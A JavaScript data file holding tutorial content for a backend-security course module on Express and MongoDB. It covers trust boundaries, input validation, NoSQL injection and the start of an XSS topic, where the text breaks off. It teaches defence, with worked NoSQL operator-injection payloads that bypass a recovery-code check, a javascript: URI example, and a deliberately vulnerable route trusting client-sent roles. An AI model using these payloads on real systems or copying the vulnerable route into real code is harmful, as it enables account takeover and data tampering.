/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 *
 * LearnSphere Module 7 — Backend Security Content (Part 1: Topics 1–5)
 */

export const module7TopicsPart1 = [
  // =========================================================================
  // TOPIC 1: Why Backend Security Matters
  // =========================================================================
  {
    topicId: '6abe9ddaf15c2b4f6008ac5a',
    title: 'Why Backend Security Matters',
    content: {
      explanation:
        'Every time a backend server connects to the internet, it becomes reachable not only by legitimate users using your official React frontend, but also by automated bots, vulnerability scanners, custom scripts, and malicious actors. A fundamental rule of backend engineering is that the client environment is completely outside your control. Attackers can bypass frontend forms, inspect browser network traffic, modify HTTP headers, and send arbitrary requests directly to your API endpoints using tools like curl or Postman. Backend security is the discipline of designing server-side defenses—such as authentication, authorization, input validation, rate limiting, and encryption—so that your application, database, and user data remain safe even when untrusted clients send malicious requests.',
      sections: [
        {
          heading: 'Learning Objectives',
          body: `- Understand why frontend validation and UI restrictions never provide true security.
- Explain the concept of a Trust Boundary and where it sits in a client-server architecture.
- Identify the three pillars of the CIA Triad: Confidentiality, Integrity, and Availability.
- Recognize the Principle of Least Privilege and the Defense-in-Depth strategy.
- Trace how an attacker bypasses a React UI to send direct HTTP requests to an Express API.`,
          order: 0,
        },
        {
          heading: 'Core Terminology',
          body: `- **Trust Boundary**: The logical line separating untrusted external inputs (browsers, mobile apps, third-party webhooks) from trusted internal server components and databases.
- **Attack Surface**: The total sum of all exposed API routes, query parameters, request headers, file upload endpoints, and network ports through which an attacker can interact with your server.
- **CIA Triad**: The foundational model of information security consisting of Confidentiality (preventing unauthorized data reads), Integrity (preventing unauthorized data modifications), and Availability (keeping the service operational for legitimate users).
- **Defense in Depth**: A layered security approach where multiple independent safeguards (e.g., CORS, rate limiting, JWT authentication, schema validation, and database role permissions) protect the system so that if one layer fails, others still stop the attack.
- **Principle of Least Privilege**: Granting every user, token, or service only the minimum permissions required to perform its intended task, and nothing more.`,
          order: 1,
        },
        {
          heading: 'Why Frontend Checks Are Never Enough',
          body: `Beginners often assume that disabling a "Delete Course" button in React or adding a \`required\` attribute to an HTML \`<input>\` stops unauthorized actions. In reality, browser code runs on the user's own computer. Anyone can open browser Developer Tools, edit JavaScript variables, or ignore the browser altogether and send raw HTTP requests straight to your backend server.

\`\`\`
Legitimate User Flow:
[React Browser UI] --(UI validation passes)--> [Express API Server] --> [MongoDB]

Attacker Flow (Bypasses UI completely):
[Terminal: curl / Postman / Python Script] ----(Forged HTTP Request)---> [Express API Server]
\`\`\`

Think of your frontend user interface like a polite sign outside a bank vault that says "Authorized Personnel Only." Honest visitors respect the sign, but a burglar ignores signs completely. Your Express backend is the steel vault door and lock mechanism—it must verify identity, permissions, and payload safety on every single incoming HTTP request, regardless of where the request claims to come from.`,
          order: 2,
        },
        {
          heading: 'The CIA Triad in Backend Engineering',
          body: `Every backend security control you implement protects one or more pillars of the **CIA Triad**:

1. **Confidentiality (Keeping Secrets Private)**
   - Ensures sensitive data—such as password hashes, personal emails, private student notes, and unpublished draft courses—can only be read by authorized parties.
   - *Backend controls*: JWT authentication, ownership checks, HTTPS/TLS encryption in transit, and stripping sensitive fields (like \`passwordHash\`) before returning JSON responses.

2. **Integrity (Preventing Unauthorized Tampering)**
   - Ensures data stored in MongoDB cannot be corrupted, forged, or altered by unauthorized users.
   - *Backend controls*: Role-Based Access Control (RBAC), strict field whitelisting (so a student registration request cannot set \`role: "admin"\`), cryptographic JWT signatures, and Mongoose schema validators.

3. **Availability (Keeping the API Online)**
   - Ensures legitimate learners and course creators can reliably access the platform without downtime caused by traffic floods or resource exhaustion.
   - *Backend controls*: Rate limiting (\`express-rate-limit\`), JSON body size limits (\`express.json({ limit: '100kb' })\`), and proper error handling so an unhandled exception in one request never crashes the entire Node.js process.`,
          order: 3,
        },
        {
          heading: 'Defense in Depth in LearnSphere',
          body: `Production backends never rely on a single security check. Instead, LearnSphere uses **Defense in Depth**—a pipeline of security middleware layers where each layer guards against a specific class of threat before a controller ever touches MongoDB:

\`\`\`
Incoming HTTP Request
   │
   ├─► Layer 1: Helmet Security Headers (Protects browser against framing/MIME sniffing)
   ├─► Layer 2: CORS Policy (Blocks unauthorized cross-origin browser scripts)
   ├─► Layer 3: Rate Limiter (Blocks brute-force and DoS request floods with 429)
   ├─► Layer 4: Body Parser & Input Sanitization (Validates types, rejects NoSQL operators)
   ├─► Layer 5: JWT Authentication (Verifies cryptographic token signature -> 401)
   ├─► Layer 6: Role & Ownership Authorization (Verifies course_creator / admin -> 403/404)
   ├─► Layer 7: Mongoose Schema & Field Whitelisting (Persists only safe, expected fields)
   ▼
MongoDB Database
\`\`\`

Even if an attacker has a valid student account (passing Layers 1–5), Layer 6 blocks them from modifying a course. Even if an authorized \`course_creator\` accidentally sends malformed data (passing Layers 1–6), Layer 7 rejects invalid data types before they reach the database.`,
          order: 4,
        },
        {
          heading: 'Common Beginner Mistakes',
          body: `- **Trusting hidden form fields or client-sent IDs**: Relying on \`req.body.userId\` or \`req.body.role\` sent from the browser instead of deriving identity and role from the verified server-side JWT payload (\`req.user\`).
- **Security by obscurity**: Assuming that because an API endpoint URL (like \`/api/admin/delete-all\`) is not linked on the frontend navbar, nobody will find or call it. Automated scanners test thousands of common API paths per second.
- **Returning full database documents**: Sending \`res.json(user)\` directly from Mongoose without removing internal fields, accidentally exposing password hashes, reset tokens, or internal flags.
- **Treating security as an afterthought**: Waiting until after an application is built to add authentication, validation, and ownership checks, which often leaves forgotten endpoints unprotected.`,
          order: 5,
        },
        {
          heading: 'Suggested Practice Task',
          body: `1. Inspect a route in an Express application (such as updating a user profile or creating a course module).
2. List five assumptions a naive implementation might make about the incoming request (for example: "the caller is logged in", "the email is a string", "the caller owns this course").
3. For each assumption, write down which layer of Defense in Depth verifies that assumption on the server and what HTTP status code (\`400\`, \`401\`, \`403\`, \`404\`, or \`429\`) should be returned if the check fails.`,
          order: 6,
        },
        {
          heading: 'Topic Summary',
          body: `- The client (browser, mobile app, or CLI tool) is always untrusted; every security rule must be enforced on the backend server.
- A Trust Boundary separates untrusted external HTTP requests from your Express business logic and MongoDB database.
- Backend security protects Confidentiality, Integrity, and Availability (the CIA Triad).
- Defense in Depth combines multiple independent layers—headers, CORS, rate limiting, authentication, authorization, and input validation—so no single point of failure compromises the system.`,
          order: 7,
        },
      ],
    },
    codeExamples: [
      {
        title: 'Vulnerable Endpoint vs. Defense-in-Depth Endpoint',
        language: 'javascript',
        code: `import express from 'express';
import Course from '../models/Course.js';
import { authenticate } from '../middleware/authenticate.js';
import { authorizeRoles } from '../middleware/authorize.js';

const router = express.Router();

// ❌ VULNERABLE: Trusts client-supplied role and updates all fields blindly
router.patch('/vulnerable/courses/:courseId', async (req, res) => {
  // Anyone can send { "role": "course_creator", "status": "published" } in req.body!
  if (req.body.role !== 'course_creator') {
    return res.status(403).json({ error: 'Forbidden' });
  }
  const updated = await Course.findByIdAndUpdate(req.params.courseId, req.body, { new: true });
  return res.json(updated);
});

// ✅ SECURE: Enforces authentication, role authorization, ownership, and field whitelisting
router.patch(
  '/secure/courses/:courseId',
  authenticate,
  authorizeRoles('course_creator', 'admin'),
  async (req, res, next) => {
    try {
      const { title, description } = req.body;
      const allowedUpdates = {};

      if (typeof title === 'string' && title.trim().length >= 3) {
        allowedUpdates.title = title.trim();
      }
      if (typeof description === 'string') {
        allowedUpdates.description = description.trim();
      }

      // Scope query by both _id and createdBy to enforce resource ownership
      const course = await Course.findOneAndUpdate(
        { _id: req.params.courseId, createdBy: req.user.id },
        { $set: allowedUpdates },
        { returnDocument: 'after', runValidators: true }
      ).lean();

      if (!course) {
        return res.status(404).json({ error: 'Not Found', message: 'Course not found.' });
      }

      return res.status(200).json({ status: 'ok', data: { course } });
    } catch (err) {
      next(err);
    }
  }
);`,
        explanation:
          'The vulnerable route trusts req.body.role from the client and passes the raw req.body object straight into findByIdAndUpdate, allowing anyone to spoof their role and overwrite protected fields. The secure route verifies identity via JWT middleware, checks canonical roles on the server, scopes the database update to the owning creator (createdBy: req.user.id), and whitelists only safe string fields.',
      },
    ],
    importantPoints: [
      'Frontend UI checks improve user experience, but they provide zero protection against attackers who call your API directly.',
      'Never trust data across a Trust Boundary—treat req.body, req.query, req.params, and req.headers as untrusted until validated.',
      'Confidentiality prevents unauthorized data reads; Integrity prevents unauthorized data tampering; Availability keeps the service responsive.',
      'Always derive user identity and role from verified server-side state (req.user), never from client-submitted request bodies.',
      'Defense in Depth layers multiple security controls so that a single flaw does not expose the entire backend.',
    ],
    externalReferences: [
      {
        title: 'OWASP Top 10 Web Application Security Risks',
        url: 'https://owasp.org/www-project-top-ten/',
        source: 'OWASP Foundation',
      },
      {
        title: 'Express.js Production Best Practices: Security',
        url: 'https://expressjs.com/en/advanced/best-practice-security.html',
        source: 'Express.js Official Documentation',
      },
    ],
    videos: { english: null, telugu: null, hindi: null },
    images: [],
  },

  // =========================================================================
  // TOPIC 2: Input Validation and Sanitization
  // =========================================================================
  {
    topicId: '6abe9ddbf15c2b4f6008ac5b',
    title: 'Input Validation and Sanitization',
    content: {
      explanation:
        'Every piece of data arriving in an HTTP request—whether in req.body, req.query, or req.params—is controlled by the client. Even though JSON payloads look structured, an attacker can send a number where your code expects a string, an object where your code expects an email address, a 50-megabyte string to exhaust server memory, or extra fields attempting to overwrite administrative properties. Input validation verifies that incoming data meets strict rules for type, format, length, and allowed values, rejecting invalid requests immediately with HTTP 400 Bad Request. Input sanitization cleans and normalizes valid input—such as trimming leading and trailing whitespace, lowercasing email addresses, and stripping unexpected fields—before the data ever reaches your business logic or database.',
      sections: [
        {
          heading: 'Learning Objectives',
          body: `- Distinguish clearly between Input Validation (checking rules) and Input Sanitization (cleaning and normalizing data).
- Validate primitive data types (\`typeof value === 'string'\`), string lengths, numeric ranges, enums, and MongoDB ObjectIds.
- Prevent Mass Assignment (over-posting) attacks by applying strict field whitelisting.
- Understand why validating at the API boundary is necessary even when Mongoose schema validation exists.
- Return clear, safe \`400 Bad Request\` responses when validation fails.`,
          order: 0,
        },
        {
          heading: 'Core Terminology',
          body: `- **Input Validation**: The process of testing whether incoming input conforms to expected constraints (data type, required presence, minimum/maximum length, regex format, or allowed enum list).
- **Input Sanitization**: The process of transforming or cleaning input so it is safe and consistent (e.g., \`.trim()\`, \`.toLowerCase()\`, removing disallowed keys, or clamping numbers).
- **Field Whitelisting (Allowlisting)**: Explicitly picking only the exact properties an endpoint permits (such as \`title\` and \`description\`) and ignoring all other properties in \`req.body\`.
- **Mass Assignment Vulnerability**: A security flaw where an application passes \`req.body\` directly into a database create or update call, allowing an attacker to overwrite sensitive model fields like \`role\`, \`isVerified\`, or \`createdBy\`.
- **Fail-Fast Validation**: Checking input validity at the very beginning of a controller or middleware and returning \`400 Bad Request\` before executing any database queries.`,
          order: 1,
        },
        {
          heading: 'Validation vs. Sanitization: How They Work Together',
          body: `Think of an airport security checkpoint:
- **Validation** is checking the passenger's boarding pass and ID—if the ticket is missing, expired, or for the wrong date, the passenger is turned away immediately (\`400 Bad Request\`).
- **Sanitization** is asking the passenger to remove their shoes and place items neatly into trays so everything enters the secure area in a clean, standardized format.

\`\`\`
Raw Request Body:
{
  "name": "   Ada Lovelace   ",
  "email": "  ADA@Example.COM ",
  "role": "admin"               <-- Malicious extra field!
}
        │
        ▼
[1. Whitelist & Type Check]
  - Pick only "name" and "email" (drops "role")
  - Verify both are typeof 'string'
        │
        ▼
[2. Sanitize / Normalize]
  - name = name.trim()          --> "Ada Lovelace"
  - email = email.trim().toLowerCase() --> "ada@example.com"
        │
        ▼
[3. Validate Constraints]
  - name.length >= 2 && <= 100
  - email matches standard email pattern
        │
        ▼
Safe Data Passed to Service / MongoDB
\`\`\`

Always check \`typeof value === 'string'\` **before** calling string methods like \`.trim()\` or \`.toLowerCase()\`. If a client sends \`{ "email": { "$gt": "" } }\` or \`{ "email": 12345 }\`, calling \`req.body.email.trim()\` without a type check will throw a \`TypeError: req.body.email.trim is not a function\`.`,
          order: 2,
        },
        {
          heading: 'Validating Route Params, Query Strings, and Request Bodies',
          body: `A backend endpoint receives user input from three primary places, and all three must be validated:

1. **Route Parameters (\`req.params\`)**
   - When a route expects a MongoDB document ID like \`/api/courses/:courseId\`, validate it using \`mongoose.Types.ObjectId.isValid(courseId)\` before querying MongoDB. If invalid, return \`400 Bad Request\` immediately instead of letting Mongoose throw a \`CastError\`.

2. **Query Parameters (\`req.query\`)**
   - Query strings like \`?page=2&limit=50\` arrive as strings (or arrays/objects if duplicated). Parse numbers carefully with \`Number.parseInt(req.query.limit, 10)\`, check for \`Number.isNaN()\`, and clamp values to safe bounds (for example, maximum \`50\` items per page so a client cannot request \`?limit=1000000\`).

3. **Request Bodies (\`req.body\`)**
   - Verify \`req.body\` is a plain object, check required fields, enforce maximum lengths (matching your Mongoose schema limits), and validate enum values against an explicit array of allowed strings.`,
          order: 3,
        },
        {
          heading: 'Preventing Mass Assignment with Field Whitelisting',
          body: `In LearnSphere, the \`User\` model has a \`role\` field (\`'student'\`, \`'course_creator'\`, \`'admin'\`), and the \`Course\` model has a \`status\` field (\`'draft'\`, \`'published'\`) and \`createdBy\`.

If the registration controller wrote \`await User.create(req.body)\`, a malicious user could register with \`{ "name": "Eve", "email": "eve@test.com", "password": "...", "role": "admin" }\` and gain full administrative control!

LearnSphere prevents Mass Assignment by:
1. Extracting only specific permitted fields from \`req.body\`.
2. Explicitly hardcoding or server-deriving sensitive fields (for example, public registration never accepts \`role\` from \`req.body\` and always creates a \`'student'\`; topic creation in \`courseCreatorTopicService.js\` constructs a \`cleanData\` object containing only \`moduleId\`, \`courseId\`, \`title\`, \`description\`, and \`order\`).`,
          order: 4,
        },
        {
          heading: 'Common Beginner Mistakes',
          body: `- **Calling \`.trim()\` before checking \`typeof\`**: Assuming \`req.body.title\` is always a string. An attacker can send JSON arrays, numbers, booleans, or nested objects in \`req.body\`.
- **Using blacklists instead of whitelists**: Doing \`delete req.body.role\` and passing the rest of \`req.body\` to the database. If a developer later adds a new internal field like \`isVerified\` to the schema, the blacklist forgets to delete it. Always whitelist allowed fields instead.
- **Relying solely on Mongoose schema validation**: While Mongoose validators are a great final safety net at the database layer, validating at the controller/service boundary catches bad input early, avoids unnecessary database round-trips, and gives you full control over clear \`400\` error messages.
- **Forgetting maximum length checks**: Allowing unbounded strings in descriptions or notes, which can bloat documents and slow down queries.`,
          order: 5,
        },
        {
          heading: 'Suggested Practice Task',
          body: `Write a helper function \`validateAndSanitizeTopicInput(body)\` that accepts an untrusted \`req.body\` object and:
1. Verifies \`body\` is a non-null object.
2. Checks that \`body.title\` is a string, trims it, and verifies its length is between 2 and 200 characters.
3. Checks if \`body.description\` is provided; if so, verifies it is a string, trims it, and ensures it does not exceed 2000 characters.
4. Ignores any unexpected fields like \`courseId\`, \`_id\`, or \`createdAt\`, returning \`{ isValid: true, data: { title, description } }\` or \`{ isValid: false, message }\`.`,
          order: 6,
        },
        {
          heading: 'Topic Summary',
          body: `- Input validation ensures incoming data satisfies strict type, format, and length rules; input sanitization normalizes and cleans data before use.
- Always check \`typeof field === 'string'\` before invoking string methods on JSON request properties.
- Validate all input sources: \`req.params\` (e.g., \`ObjectId.isValid\`), \`req.query\` (pagination bounds), and \`req.body\`.
- Always construct database payloads using an explicit field whitelist to prevent Mass Assignment vulnerabilities.`,
          order: 7,
        },
      ],
    },
    codeExamples: [
      {
        title: 'Boundary Validation, Sanitization, and Whitelisting in Express',
        language: 'javascript',
        code: `import mongoose from 'mongoose';
import Topic from '../models/Topic.js';

export const updateTopicMetadata = async (req, res, next) => {
  try {
    const { courseId, moduleId, topicId } = req.params;

    // 1. Validate route parameters (ObjectId format)
    if (
      !mongoose.Types.ObjectId.isValid(courseId) ||
      !mongoose.Types.ObjectId.isValid(moduleId) ||
      !mongoose.Types.ObjectId.isValid(topicId)
    ) {
      return res.status(400).json({
        error: 'Bad Request',
        message: 'Invalid course, module, or topic ID format.',
      });
    }

    // 2. Ensure body is a plain object
    if (!req.body || typeof req.body !== 'object' || Array.isArray(req.body)) {
      return res.status(400).json({
        error: 'Bad Request',
        message: 'Request body must be a valid JSON object.',
      });
    }

    // 3. Whitelist and sanitize only allowed fields
    const cleanUpdate = {};

    if (req.body.title !== undefined) {
      if (typeof req.body.title !== 'string') {
        return res.status(400).json({ error: 'Bad Request', message: 'Title must be a string.' });
      }
      const trimmedTitle = req.body.title.trim();
      if (trimmedTitle.length < 2 || trimmedTitle.length > 200) {
        return res.status(400).json({
          error: 'Bad Request',
          message: 'Title must be between 2 and 200 characters.',
        });
      }
      cleanUpdate.title = trimmedTitle;
    }

    if (req.body.description !== undefined) {
      if (typeof req.body.description !== 'string') {
        return res.status(400).json({ error: 'Bad Request', message: 'Description must be a string.' });
      }
      const trimmedDesc = req.body.description.trim();
      if (trimmedDesc.length > 2000) {
        return res.status(400).json({
          error: 'Bad Request',
          message: 'Description cannot exceed 2000 characters.',
        });
      }
      cleanUpdate.description = trimmedDesc;
    }

    // Any extra fields in req.body (like courseId, _id, or role) are completely ignored!
    const updated = await Topic.findOneAndUpdate(
      { _id: topicId, moduleId, courseId },
      { $set: cleanUpdate },
      { returnDocument: 'after', runValidators: true }
    ).lean();

    if (!updated) {
      return res.status(404).json({ error: 'Not Found', message: 'Topic not found.' });
    }

    return res.status(200).json({ status: 'ok', data: { topic: updated } });
  } catch (err) {
    next(err);
  }
};`,
        explanation:
          'This controller validates MongoDB ObjectIds in req.params first, checks primitive types before calling .trim(), enforces length constraints, and builds a cleanUpdate whitelist object so untrusted properties in req.body are never passed to MongoDB.',
      },
    ],
    importantPoints: [
      'Validation checks whether input obeys strict rules; sanitization cleans and normalizes input into a safe, predictable form.',
      'Always verify typeof value === "string" before calling string methods like .trim() or .toLowerCase() on JSON body fields.',
      'Validate MongoDB ObjectIds in req.params using mongoose.Types.ObjectId.isValid() before running database queries.',
      'Prevent Mass Assignment by whitelisting only specific permitted fields rather than passing req.body directly to Mongoose.',
      'Enforce both minimum and maximum bounds on strings, arrays, and pagination query parameters.',
    ],
    externalReferences: [
      {
        title: 'OWASP Input Validation Cheat Sheet',
        url: 'https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html',
        source: 'OWASP Cheat Sheet Series',
      },
      {
        title: 'Mongoose Built-in and Custom Validators',
        url: 'https://mongoosejs.com/docs/validation.html',
        source: 'Mongoose Official Documentation',
      },
    ],
    videos: { english: null, telugu: null, hindi: null },
    images: [],
  },

  // =========================================================================
  // TOPIC 3: NoSQL Injection
  // =========================================================================
  {
    topicId: '6abe9ddbf15c2b4f6008ac5c',
    title: 'NoSQL Injection',
    content: {
      explanation:
        'Many developers mistakenly believe that injection attacks only happen in SQL databases where query strings are concatenated. In MongoDB and Mongoose, queries are constructed using JavaScript objects and special query operators that begin with a dollar sign ($), such as $ne (not equal), $gt (greater than), $in, and $where. Because Express parses incoming JSON request bodies directly into JavaScript objects via express.json(), an attacker can send a nested JSON object containing a MongoDB operator—like { "email": { "$gt": "" } }—instead of a plain string. If your backend passes that untrusted value directly into User.findOne({ email: req.body.email }), MongoDB executes the attacker’s operator, allowing them to bypass login checks or extract unauthorized records. Understanding and preventing NoSQL Injection is essential for every Node.js and MongoDB engineer.',
      sections: [
        {
          heading: 'Learning Objectives',
          body: `- Explain how NoSQL Injection works when JSON request bodies are passed into MongoDB/Mongoose queries.
- Trace how a \`{ "$ne": null }\` or \`{ "$gt": "" }\` operator injection can bypass a vulnerable query.
- Prevent NoSQL Injection using strict primitive type checks (\`typeof val === 'string'\`).
- Understand how stripping or rejecting keys starting with \`$\` or containing \`.\` neutralizes operator injection.
- Recognize why Mongoose schema casting helps on typed fields and where raw objects can still slip through.`,
          order: 0,
        },
        {
          heading: 'Core Terminology',
          body: `- **NoSQL Injection**: A vulnerability where untrusted user input containing database query operators (such as \`$ne\`, \`$gt\`, \`$regex\`, or \`$or\`) alters the structure and logic of a NoSQL database query.
- **Query Operator Injection**: Sending a JSON object like \`{ "$ne": "invalid" }\` in place of a scalar string or number so that MongoDB evaluates a comparison expression instead of an exact match.
- **Dollar-Prefixed Key (\`$\`)**: MongoDB's reserved syntax for query and update operators (\`$set\`, \`$where\`, \`$gt\`, \`$in\`). User input keys should never start with \`$\`.
- **Dot Notation (\`.\`)**: MongoDB syntax used to reference nested document fields (e.g., \`"profile.isAdmin"\`). Untrusted keys containing dots can manipulate nested properties if passed into update objects.
- **Type Enforcement**: Explicitly verifying that an input value is a primitive string, number, or valid ObjectId before embedding it in a query filter.`,
          order: 1,
        },
        {
          heading: 'Anatomy of a MongoDB Operator Injection Attack',
          body: `Consider a naive endpoint that looks up a user account by email and secret recovery code:

\`\`\`javascript
// ❌ Vulnerable lookup
const user = await User.findOne({
  email: req.body.email,
  recoveryCode: req.body.recoveryCode,
});
\`\`\`

In normal usage, a user sends strings:
\`\`\`json
{
  "email": "admin@learnsphere.io",
  "recoveryCode": "948201"
}
\`\`\`

Now look at what happens when an attacker sends a JSON object as \`recoveryCode\`:
\`\`\`json
{
  "email": "admin@learnsphere.io",
  "recoveryCode": { "$ne": "wrong_code" }
}
\`\`\`

Because \`express.json()\` parses JSON objects natively, \`req.body.recoveryCode\` becomes the JavaScript object \`{ $ne: 'wrong_code' }\`. The query executed by MongoDB becomes:

\`\`\`
User.findOne({
  email: "admin@learnsphere.io",
  recoveryCode: { $ne: "wrong_code" }   // Matches ANY value not equal to "wrong_code"!
})
\`\`\`

Instead of checking whether the recovery code equals the real code, MongoDB checks whether \`recoveryCode\` is *not equal* to \`"wrong_code"\`—which evaluates to **true**, returning the admin account without knowing the secret code!`,
          order: 2,
        },
        {
          heading: 'Three Layers of Defense Against NoSQL Injection',
          body: `To completely eliminate NoSQL Injection in an Express + Mongoose backend, combine three practical defenses:

\`\`\`
Incoming JSON Payload: { "email": { "$gt": "" } }
   │
   ├─► Defense 1: Primitive Type Validation (Controller/Service Boundary)
   │     Check: typeof req.body.email === 'string'
   │     Result: False! Immediately return 400 Bad Request.
   │
   ├─► Defense 2: Operator Key Sanitization
   │     Recursively reject or strip any object keys starting with '$' or containing '.'
   │
   └─► Defense 3: Explicit Query Construction & Mongoose Schemas
         Never pass raw req.body or req.query directly into Model.find(req.query).
         Always map validated scalar variables: Model.findOne({ email: String(cleanEmail) })
\`\`\`

In LearnSphere's authentication controller (\`server/controllers/authController.js\`), before any database query runs, the server explicitly verifies \`typeof email === 'string'\` and \`typeof password === 'string'\`. If an attacker sends \`{ "email": { "$ne": null }, "password": "abc" }\`, the \`typeof\` check fails immediately and returns \`400 Bad Request\` before MongoDB or \`bcrypt\` is ever called.`,
          order: 3,
        },
        {
          heading: 'Safe Use of Regular Expressions in Search Queries',
          body: `Another subtle NoSQL vector involves building search filters with \`$regex\`. If a backend passes raw user search text directly into \`new RegExp(req.query.search, 'i')\`, an attacker can supply special regex characters (or a catastrophic backtracking pattern causing Regular Expression Denial of Service, known as **ReDoS**).

Whenever you implement a search filter using \`$regex\`:
1. Confirm the search term is a string and enforce a reasonable maximum length (e.g., 100 characters).
2. Escape special regular expression characters (\`.*+?^$\${}()|[]\\\\\`) before constructing the \`RegExp\` so user input is treated strictly as literal characters.`,
          order: 4,
        },
        {
          heading: 'Common Beginner Mistakes',
          body: `- **Passing \`req.query\` or \`req.body\` directly into \`Model.find()\`**: Writing \`await Course.find(req.query)\` lets callers inject arbitrary filter fields and MongoDB operators into the query.
- **Checking truthiness instead of type**: Writing \`if (!req.body.email)\` does not stop NoSQL injection because the object \`{ "$ne": null }\` is truthy in JavaScript! Always check \`if (typeof req.body.email !== 'string')\`.
- **Using the \`$where\` operator with user input**: MongoDB's \`$where\` operator evaluates JavaScript expressions. Passing user input into \`$where\` can lead to arbitrary server-side code execution. Never use \`$where\` with untrusted data.
- **Building unescaped \`RegExp\` objects from query params**: Allowing arbitrary regex metacharacters in search queries without escaping them first.`,
          order: 5,
        },
        {
          heading: 'Suggested Practice Task',
          body: `1. Write a recursive utility function \`containsNoSqlOperators(obj)\` that inspects any JavaScript object or array and returns \`true\` if any property key starts with \`'$'\` or contains \`'.'\`.
2. Test your function with:
   - \`{ email: "student@learnsphere.io" }\` (should return \`false\`)
   - \`{ email: { "$ne": null } }\` (should return \`true\`)
   - \`{ filter: [{ "$gt": 10 }] }\` (should return \`true\`)
3. Wrap it in an Express middleware that returns \`400 Bad Request\` whenever \`req.body\` or \`req.query\` contains a prohibited operator key.`,
          order: 6,
        },
        {
          heading: 'Topic Summary',
          body: `- NoSQL Injection occurs when untrusted objects containing MongoDB operators (like \`$ne\`, \`$gt\`, \`$in\`) are passed into database queries.
- Checking \`if (!req.body.field)\` is insufficient because an injected object \`{ "$ne": null }\` is truthy in JavaScript.
- Enforce strict primitive type checks (\`typeof field === 'string'\`) on all query inputs before calling Mongoose.
- Never pass raw \`req.body\` or \`req.query\` objects directly into \`Model.find()\`, \`Model.findOne()\`, or \`Model.updateOne()\`.`,
          order: 7,
        },
      ],
    },
    codeExamples: [
      {
        title: 'Defending Against NoSQL Operator Injection and Unsafe Regex Queries',
        language: 'javascript',
        code: `import Course from '../models/Course.js';
import User from '../models/User.js';

// Helper to escape special regex characters so user input is matched literally
function escapeRegex(text) {
  return text.replace(/[.*+?^$\${}()|[\\]\\\\]/g, '\\\\$&');
}

// Helper middleware to reject any '$' or '.' keys in req.body / req.query
export function rejectNoSqlOperators(req, res, next) {
  const hasProhibitedKey = (value) => {
    if (!value || typeof value !== 'object') return false;
    for (const key of Object.keys(value)) {
      if (key.startsWith('$') || key.includes('.')) return true;
      if (hasProhibitedKey(value[key])) return true;
    }
    return false;
  };

  if (hasProhibitedKey(req.body) || hasProhibitedKey(req.query)) {
    return res.status(400).json({
      error: 'Bad Request',
      message: 'Invalid query or payload structure.',
    });
  }
  next();
}

// ✅ SECURE: Strict string type verification before querying User
export async function findUserByEmailSafe(req, res, next) {
  try {
    const { email } = req.body;

    // Blocks { "email": { "$ne": null } } immediately
    if (typeof email !== 'string' || email.trim().length === 0) {
      return res.status(400).json({
        error: 'Bad Request',
        message: 'A valid email string is required.',
      });
    }

    const normalizedEmail = email.trim().toLowerCase();
    const user = await User.findOne({ email: normalizedEmail }).select('name email role').lean();

    if (!user) {
      return res.status(404).json({ error: 'Not Found', message: 'User not found.' });
    }

    return res.status(200).json({ status: 'ok', data: { user } });
  } catch (err) {
    next(err);
  }
}

// ✅ SECURE: Safe catalog search escaping regex characters
export async function searchPublishedCoursesSafe(req, res, next) {
  try {
    const rawSearch = typeof req.query.q === 'string' ? req.query.q.trim().slice(0, 100) : '';
    const filter = { status: 'published' };

    if (rawSearch.length > 0) {
      const safePattern = escapeRegex(rawSearch);
      filter.title = { $regex: safePattern, $options: 'i' };
    }

    const courses = await Course.find(filter).select('title description category level').lean();
    return res.status(200).json({ status: 'ok', courses });
  } catch (err) {
    next(err);
  }
}`,
        explanation:
          'This example demonstrates three complementary NoSQL injection defenses: a recursive middleware that blocks keys starting with "$" or containing ".", explicit typeof === "string" enforcement before querying by email, and regex escaping for safe text searches.',
      },
    ],
    importantPoints: [
      'Because express.json() parses nested JSON objects, an attacker can send { "$ne": null } instead of a string in req.body.',
      'In JavaScript, Boolean({ "$ne": null }) is true—always check typeof value === "string" rather than relying on truthiness.',
      'Never pass raw req.body or req.query directly into Mongoose query methods like Model.find(req.query).',
      'Reject or strip object keys beginning with "$" or containing "." in untrusted payloads.',
      'Always escape special characters and cap string length before passing user search terms into a MongoDB $regex filter.',
    ],
    externalReferences: [
      {
        title: 'OWASP NoSQL Injection Testing Guide',
        url: 'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection',
        source: 'OWASP Foundation',
      },
      {
        title: 'MongoDB Manual: Query and Projection Operators',
        url: 'https://www.mongodb.com/docs/manual/reference/operator/query/',
        source: 'MongoDB Official Documentation',
      },
    ],
    videos: { english: null, telugu: null, hindi: null },
    images: [],
  },

  // =========================================================================
  // TOPIC 4: XSS and Unsafe Input
  // =========================================================================
  {
    topicId: '6abe9ddcf15c2b4f6008ac5d',
    title: 'XSS and Unsafe Input',
    content: {
      explanation:
        'Cross-Site Scripting (XSS) occurs when an attacker manages to inject malicious JavaScript or HTML into content that is later rendered and executed inside another user’s browser. While XSS executes in the browser, the backend plays a critical role in preventing it—especially in Stored XSS, where an attacker submits malicious scripts inside a course description, comment, note, or external reference URL that gets saved in MongoDB and served to every student who views that page. Defending against XSS requires a combination of strict backend input validation, URL protocol whitelisting (blocking javascript: and data: URLs), serving JSON APIs with proper Content-Type headers, and safe output escaping when rendering content.',
      sections: [
        {
          heading: 'Learning Objectives',
          body: `- Understand what Cross-Site Scripting (XSS) is and why Stored XSS is especially dangerous in educational platforms.
- Differentiate between Stored XSS, Reflected XSS, and DOM-Based XSS.
- Identify dangerous URL schemes (\`javascript:\`, \`data:\`, \`vbscript:\`) and enforce \`https://\` protocol whitelisting on links and image URLs.
- Explain how backend sanitization, \`Content-Type: application/json\`, and React's automatic JSX escaping work together.
- Understand why \`httpOnly\` cookies protect refresh tokens even if an XSS flaw occurs.`,
          order: 0,
        },
        {
          heading: 'Core Terminology',
          body: `- **Cross-Site Scripting (XSS)**: A vulnerability where untrusted input is interpreted as executable code (\`<script>\`, event handlers like \`onerror=\`, or \`javascript:\` URIs) inside a victim's browser session.
- **Stored (Persistent) XSS**: An attack where malicious markup is saved in the backend database (e.g., in a topic body, student note, or user profile name) and served later to other users.
- **Reflected XSS**: An attack where untrusted input from a request (such as a query parameter) is echoed back immediately inside an HTML response without escaping.
- **Protocol Whitelisting**: Validating that user-supplied URLs begin strictly with safe protocols (\`https://\` or \`http://\`) to prevent \`javascript:alert(1)\` execution when a link is clicked.
